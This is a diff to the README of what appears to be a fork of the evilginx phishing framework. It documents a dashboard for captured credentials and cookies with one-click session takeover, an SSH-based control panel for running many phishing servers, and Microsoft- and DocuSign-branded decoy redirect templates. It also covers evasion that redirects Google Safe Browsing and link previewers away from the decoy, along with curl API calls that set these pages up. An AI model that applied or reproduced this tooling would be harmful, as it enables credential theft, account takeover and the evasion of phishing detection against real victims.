@@ -475,11 +475,19 @@ autolures delete 0
 
 ---
 
-# PART 12: CONTROL PANEL
+# PART 12: DASHBOARD (per-server)
 
-The fork ships a full web control panel — a clean, minimalist single-page app that
-drives **every** feature from the browser. It is served on the dashboard port and,
-optionally, on an HTTPS subdomain.
+Each deployment serves its own **Dashboard** — a clean, minimalist single-page app
+that drives every engine feature from the browser. This is what the person running
+the campaign opens: captured sessions, one-click cookie takeover, phishlets, lures,
+blacklist and settings. It works with the Session Injector extension (Part 12a).
+
+> **Control Panel vs Dashboard.** The Dashboard runs *inside* evilginx on the VPS.
+> The **Control Panel** is a *separate* app you run on your own machine that
+> SSH‑installs and manages one or many servers, and hands users their Dashboard
+> link + extension. See **[CONTROL-PANEL.md](CONTROL-PANEL.md)**.
+
+The Dashboard is served on the dashboard port and, optionally, on an HTTPS subdomain.
 
 ## Access
 
@@ -498,19 +506,21 @@ also accepted (handy for `curl`), and a `Bearer <token>` header works too.
 If both username and password are empty, auth is disabled entirely — always set
 at least a password on a public VPS.
 
-## Pages
+## What the Dashboard shows
 
-| Page | What it does |
+The Dashboard is deliberately **Sessions-only** — end users get the least possible
+surface. Everything else is done from the Control Panel.
+
+| Area | What it does |
 |------|--------------|
-| **Overview** | Live stats (sessions, tokens, capture rate, unique IPs, active sessions), a 14-day capture sparkline, top phishlets, top countries, recent captures |
-| **Sessions** | Searchable / filterable / sortable capture table; row drawer with credentials, GeoIP + user-agent, full token JSON; one-click takeover; CSV/JSON export; bulk and full clear |
-| **Phishlets** | Per-phishlet cards — enable / disable, hide / unhide, set hostname, per-phishlet `unauth_url`, reload from disk, view raw YAML, copy DNS records; reload-all |
-| **Lures** | Create (optionally with encrypted URL params), edit every field (path, hostname, redirect, UA filter, active hours/days/tz, OG tags), clone, pause/resume, delete, copy the shareable link |
-| **Autolures** | Create self-rotating lures with a fixed or random interval; live countdown to next rotation; Telegram notify toggle; delete |
-| **Redirects** | Manage decoy landing pages — add/remove subdomain → HTML file mappings, optional Turnstile gate, pick from the files present in the redirects dir |
-| **Blacklist** | Switch mode (off / unauth / noadd / all), add and remove IPs, see counts |
-| **Settings** | General, Anti-detection, Integrations, Dashboard and outbound-proxy settings with inline editing; Telegram & GoPhish connection tests; Turnstile keys; certificate re-provisioning |
-| **System** | Version/uptime, domain, cert subject + expiry, posture flags, and the DNS records to point at the server |
+| **Sessions** | Searchable / filterable capture table; row drawer with credentials, GeoIP + user-agent, full cookie JSON; one-click takeover; CSV/JSON export; bulk delete |
+
+Statistics (captures, token rate, unique IPs, active now) are shown in the header,
+and auto-refresh runs every 10 s.
+
+The full engine API (phishlets, lures, autolures, redirects, blacklist, config,
+system, integrations) still exists under `/api/v1/` — the Control Panel drives it
+remotely.
 
 ## Live credential updates
 
@@ -642,6 +652,68 @@ redirects add landing loading.html on
 - `[target_url]` — optional; if omitted, the HTML handles its own redirect
 - `[on|off]` — optional; `on` enables Cloudflare Turnstile gate (requires `-turnstile` flag at startup)
 
+## Template library (recommended)
+
+The engine ships **8 ready-made redirect designs**, embedded in the binary (nothing
+to upload). Manage them from the Control Panel → *Redirects* → pick a template →
+preview in-line → **Create**. The engine writes the chosen template into the
+redirects dir and registers the subdomain with your target URL, delay and
+Turnstile options.
+
+| Template | Category | Idea |
+|---|---|---|
+| Clean Progress | generic | minimal light page, slim bar, countdown |
+| Generic Signing In | generic | brand-neutral progress ring, "Signing you in" |
+| Minimal Loader | generic | browser-style top bar — least suspicious |
+| Microsoft Spinner | microsoft | white card, MS logo, "Signing you in…" |
+| Microsoft Loading (blue) | microsoft | full-bleed MS-blue boot screen |
+| File Ready (cloud) | file | cloud file card, "Your file is ready", Open button |
+| Document Preview | document | PDF-preview card with % progress |
+| DocuSign Redirect | document | DocuSign wordmark pre-lure screen |
+
+Templates use `__DESTINATION__` / `__DELAY__` placeholders that the engine fills at
+serve time, so changing `target_url` or `delay` takes effect immediately without
+rewriting the file. API:
+
+```bash
+curl -u admin:PASS http://VPS:5000/api/v1/redirect-templates
+curl -u admin:PASS -X POST -H 'Content-Type: application/json' \
+  -d '{"subdomain":"landing","template":"ms-spinner","target_url":"https://login.microsoftonline.com/","delay":3,"turnstile":true,"turnstile_pos":"slot","turnstile_type":"non-interactive","turnstile_theme":"auto"}' \
+  http://VPS:5000/api/v1/redirects
+```
+
+## Turnstile placement & type
+
+For any redirect page you can choose **where** and **what kind** of Turnstile to show:
+
+| `turnstile_pos` | Placement |
+|---|---|
+| `slot` *(default)* | inline where the template has its `__ts_slot__` marker |
+| `inline` | same as slot |
+| `overlay` | full-screen dim overlay, centred card |
+| `center` | fixed centred widget |
+| `bottom` | fixed above the bottom edge |
+| `corner` | fixed bottom-right |
+
+| `turnstile_type` | Behaviour |
+|---|---|
+| `managed` *(default)* | standard visible widget |
+| `non-interactive` | hidden unless interaction is needed |
+| `invisible` | `interaction-only` + flexible size, effectively invisible |
+
+`turnstile_theme` = `auto` \| `light` \| `dark`.
+
+> Set the matching widget mode in the Cloudflare dashboard; `type` above maps to
+> Turnstile's `data-appearance`/`data-size` and is the closest equivalent.
+
+## Anti-bot hardening (automatic)
+
+- A crawler/scanner User-Agent hitting a redirect page is answered with a plain
+  **302 to the target** instead of HTML — Google Safe Browsing and link previewers
+  land on the genuine site and never render the decoy.
+- `<noscript><meta http-equiv="refresh">` is injected so JS-less clients still move.
+- `X-Robots-Tag: noindex, nofollow` + `Cache-Control: no-store` are always sent.
+
 ## List and delete redirect pages
 
 ```
@@ -653,8 +725,8 @@ redirects delete 0
 
 - The wildcard cert covers all redirect page subdomains automatically
 - Multiple redirect pages can be active simultaneously
-- If `target_url` is set, the redirect URL is injected into the HTML before `</body>`
-- If Turnstile is enabled, visitors must pass the challenge before being redirected
+- Custom (non-template) files keep working: if the file has no `__DESTINATION__`
+  placeholder the engine injects a redirect before `</body>` as before
 
 ---
 
